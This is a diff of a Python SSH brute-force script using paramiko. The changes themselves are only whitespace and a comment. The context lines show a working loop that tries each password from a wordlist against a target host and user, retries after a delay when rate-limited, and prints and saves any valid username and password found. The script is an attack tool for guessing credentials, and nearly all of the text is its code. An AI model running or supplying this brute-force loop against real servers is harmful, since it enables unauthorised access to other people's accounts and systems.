@@ -48,7 +48,6 @@ def is_ssh_open(hostname, username, password):
     except socket.timeout:
 
         # this is when host is unreachable
-
         print(f"{RED}[!] Host: {hostname} is unreachable, time out .{RESET}")
         return False
 
@@ -59,15 +58,16 @@ def is_ssh_open(hostname, username, password):
     except paramiko.SSHException:
         
         print(f"\n\n{RED}[*] Quota exceeded, retrying with delay...{RESET}\n")
-        # sleep for a minute
+        # sleep for a minute to avoid SSH banner
         time.sleep(60)
         return is_ssh_open(hostname, username, password)
+      
     except OSError:
         print(f"{RED} Make sure you have Internet Connection{RESET}")
         sys.exit(1)
     else:
+      
         # connection was established successfully
-
         print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
         return True
 
@@ -80,18 +80,15 @@ if __name__ == "__main__":
     parser.add_argument("-u", "--user", help="Host username")
 
     # parse passed arguments
-
     args = parser.parse_args()
     host = args.host
     passlist = args.passlist
     user = args.user
 
     # read the file
-
     passlist = open(passlist).read().splitlines()
     
     # brute force
-
     for password in passlist:
         if is_ssh_open(host, user, password):
             # if combo is valid, save it to a file
